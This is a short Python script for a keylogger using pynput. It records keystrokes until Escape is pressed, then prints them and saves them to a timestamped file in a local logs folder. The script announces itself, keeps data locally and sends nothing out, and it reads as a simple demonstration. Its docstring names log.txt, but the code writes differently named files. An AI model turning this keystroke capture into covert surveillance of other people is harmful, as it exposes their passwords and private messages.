"""
A simple keylogger built using pynput. Outputs to log.txt
"""

from pynput import keyboard
import sys
import os
import time
def on_press(key):
    try:
        log.append(key.char)
    except AttributeError:
    	if key == keyboard.Key.space:
    		log.append(' ')
    	else:
	        log.append('{0}'.format(key))
    if key == keyboard.Key.esc:
        # Stop listener
        exit()


if __name__ == "__main__":
    # Collect events until released
    if not os.path.exists("logs"):
        os.makedirs("logs")
    print("You've started the keylogger. Press your escape key to stop logging.")
    log = []
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    print("".join(log))
    date = time.strftime("Log_%Y-%m-%d_%H-%M-%S")
    with open('logs/' + date + ".txt", 'w') as file:
        for key in log:
            file.write(str(key))